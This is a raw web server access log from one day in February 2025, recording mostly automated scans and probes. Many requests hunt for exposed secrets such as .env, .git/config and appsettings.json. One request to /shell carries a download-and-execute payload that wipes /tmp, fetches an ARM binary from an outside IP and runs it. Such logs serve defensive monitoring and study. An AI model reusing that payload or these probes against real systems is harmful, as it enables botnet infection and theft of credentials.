213.136.86.62 - - [05/Feb/2025:11:47:48 +0000] "GET /root/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:11:47:48 +0000] "GET /old/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
213.136.86.62 - - [05/Feb/2025:11:47:48 +0000] "GET /www/.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
170.64.186.221 - - [05/Feb/2025:12:01:43 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36 OPR/51.0.2830.34"
128.199.179.71 - - [05/Feb/2025:12:04:51 +0000] "\x16\x03\x01\x01\x02\x01" 400 533 "-" "-"
128.199.179.71 - - [05/Feb/2025:12:04:51 +0000] "GET /hello HTTP/1.1" 302 350 "-" "Mozilla/5.0"
128.199.170.18 - - [05/Feb/2025:12:09:52 +0000] "GET /hello HTTP/1.1" 302 350 "-" "Mozilla/5.0"
128.199.170.18 - - [05/Feb/2025:12:09:52 +0000] "\x16\x03\x01\x01\x02\x01" 400 533 "-" "-"
206.168.34.218 - - [05/Feb/2025:12:18:02 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.218 - - [05/Feb/2025:12:18:09 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.218 - - [05/Feb/2025:12:18:12 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.218 - - [05/Feb/2025:12:18:18 +0000] "GET / HTTP/1.1" 200 966 "http://34.176.179.0/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.218 - - [05/Feb/2025:12:18:20 +0000] "PRI * HTTP/2.0" 400 533 "-" "-"
36.95.48.45 - - [05/Feb/2025:12:19:54 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0"
87.121.84.7 - - [05/Feb/2025:12:25:35 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
162.216.150.212 - - [05/Feb/2025:12:35:46 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
139.59.101.104 - - [05/Feb/2025:12:45:16 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
46.19.138.234 - - [05/Feb/2025:12:52:17 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
103.157.93.216 - - [05/Feb/2025:12:53:45 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
172.169.6.20 - - [05/Feb/2025:13:12:02 +0000] "GET /hudson HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
36.213.202.229 - - [05/Feb/2025:13:15:37 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 103.241.65.218/selfreps/telnet.arm5;chmod+777+/tmp/telnet.arm5;sh+/tmp/telnet.arm5" 400 533 "-" "-"
186.90.113.118 - - [05/Feb/2025:13:18:43 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
95.214.55.132 - - [05/Feb/2025:13:37:09 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
129.226.93.214 - - [05/Feb/2025:13:48:00 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
179.43.191.146 - - [05/Feb/2025:14:10:48 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.164.41.120 - - [05/Feb/2025:14:38:01 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
18.217.98.195 - - [05/Feb/2025:14:38:25 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
18.217.98.195 - - [05/Feb/2025:14:40:31 +0000] "\n" 400 533 "-" "-"
87.121.84.7 - - [05/Feb/2025:14:41:05 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
18.217.98.195 - - [05/Feb/2025:14:41:43 +0000] "SSH-2.0-Go" 400 533 "-" "-"
18.217.98.195 - - [05/Feb/2025:14:42:54 +0000] "\x16\x03\x01" 400 533 "-" "-"
184.105.247.195 - - [05/Feb/2025:14:44:55 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/92.0.4515.159 Safari/537.36"
18.217.98.195 - - [05/Feb/2025:14:45:09 +0000] "\x16\x03\x01" 400 533 "-" "-"
184.105.247.195 - - [05/Feb/2025:14:48:18 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0"
184.105.247.195 - - [05/Feb/2025:14:49:10 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/92.0.4515.159 Safari/537.36"
78.153.140.148 - - [05/Feb/2025:14:56:38 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [05/Feb/2025:14:56:39 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
66.240.192.84 - - [05/Feb/2025:15:16:17 +0000] "\x16\x03\x01" 400 533 "-" "-"
194.50.16.252 - - [05/Feb/2025:15:35:16 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.18"
139.59.101.104 - - [05/Feb/2025:15:41:29 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
66.240.236.116 - - [05/Feb/2025:16:08:54 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
178.128.53.28 - - [05/Feb/2025:16:24:15 +0000] "\x16\x03\x01" 400 533 "-" "-"
178.128.53.28 - - [05/Feb/2025:16:24:15 +0000] "\x16\x03\x01" 400 533 "-" "-"
178.128.53.28 - - [05/Feb/2025:16:24:16 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
178.128.53.28 - - [05/Feb/2025:16:24:17 +0000] "GET /form.html HTTP/1.1" 302 331 "-" "curl/8.1.2"
178.128.53.28 - - [05/Feb/2025:16:24:17 +0000] "GET /upl.php HTTP/1.1" 302 331 "-" "Mozilla/5.0"
178.128.53.28 - - [05/Feb/2025:16:24:18 +0000] "GET /t4 HTTP/1.1" 302 331 "-" "Mozilla/5.0"
178.128.53.28 - - [05/Feb/2025:16:24:19 +0000] "GET /geoip/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
178.128.53.28 - - [05/Feb/2025:16:24:19 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
178.128.53.28 - - [05/Feb/2025:16:24:20 +0000] "GET /1.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
178.128.53.28 - - [05/Feb/2025:16:24:21 +0000] "GET /systembc/password.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
178.128.53.28 - - [05/Feb/2025:16:24:21 +0000] "GET /password.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
141.255.166.90 - - [05/Feb/2025:16:53:04 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
160.30.21.34 - - [05/Feb/2025:17:36:07 +0000] "CONNECT www.google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
195.140.213.30 - - [05/Feb/2025:17:39:02 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
195.140.213.30 - - [05/Feb/2025:17:39:03 +0000] "\x16\x03\x01" 400 533 "-" "-"
195.140.213.30 - - [05/Feb/2025:17:39:03 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
195.140.213.30 - - [05/Feb/2025:17:39:03 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
195.140.213.30 - - [05/Feb/2025:17:39:04 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
15.204.37.90 - - [05/Feb/2025:17:49:23 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
135.148.8.105 - - [05/Feb/2025:17:55:06 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
185.196.220.253 - - [05/Feb/2025:18:08:32 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
176.65.134.13 - - [05/Feb/2025:18:08:59 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
176.65.134.13 - - [05/Feb/2025:18:09:00 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
35.202.9.133 - - [05/Feb/2025:18:16:59 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; tchelebi/1.0; +http://tchelebi.io)"
95.214.55.132 - - [05/Feb/2025:18:30:50 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
198.235.24.2 - - [05/Feb/2025:18:46:35 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
80.82.77.202 - - [05/Feb/2025:18:56:58 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/36.0.1985.125 Safari/537.36"
194.50.16.252 - - [05/Feb/2025:19:37:02 +0000] "GET /appsettings.json HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
194.50.16.252 - - [05/Feb/2025:19:37:03 +0000] "GET /appsettings.Production.json HTTP/1.1" 302 292 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36"
194.50.16.252 - - [05/Feb/2025:19:37:05 +0000] "GET /api/appsettings.json HTTP/1.1" 302 292 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.7.20"
194.50.16.252 - - [05/Feb/2025:19:37:06 +0000] "GET /api/appsettings.Production.json HTTP/1.1" 302 292 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36"
46.19.138.234 - - [05/Feb/2025:19:37:33 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
216.131.114.122 - - [05/Feb/2025:19:48:03 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.1"
205.210.31.169 - - [05/Feb/2025:20:01:14 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
5.196.113.1 - - [05/Feb/2025:20:04:33 +0000] "\x16\x03\x03\x01\xa5\x01" 400 533 "-" "-"
5.196.113.5 - - [05/Feb/2025:20:04:36 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
92.255.57.58 - - [05/Feb/2025:20:05:34 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
54.38.100.158 - - [05/Feb/2025:20:11:11 +0000] "\x16\x03\x03\x01\xa5\x01" 400 533 "-" "-"
54.38.100.157 - - [05/Feb/2025:20:11:14 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
141.255.166.90 - - [05/Feb/2025:20:24:45 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
